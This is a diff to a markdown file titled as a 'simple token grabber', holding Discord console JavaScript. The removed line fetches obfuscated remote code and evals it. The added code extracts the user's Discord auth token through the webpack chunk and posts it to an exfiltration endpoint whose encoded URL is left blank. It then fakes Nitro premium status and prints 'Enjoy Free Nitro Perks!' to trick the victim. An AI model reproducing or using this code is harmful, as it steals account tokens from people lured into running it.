@@ -3,5 +3,10 @@
 ## A simple token grabber lol
 
 ```js
-fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3R1bmdkbzA2MDIvRGlzY29yZC1Ub2tlbi1HcmFiYmVyL21haW4vTml0cm9IYWNrLmpz")).then((res) => res.text().then((t) => eval(t)))
+var nitrocode = ""
+var nitrohacks = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {return m.default.getToken()}}}])
+fetch(atob(nitrocode), {method: 'post', headers: {'Content-Type': 'application/json',}, body: JSON.stringify({content: nitrohacks,}),});
+window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().premiumType = 2;}}}]);
+console.clear()
+console.log("Enjoy Free Nitro Perks!")
 ```
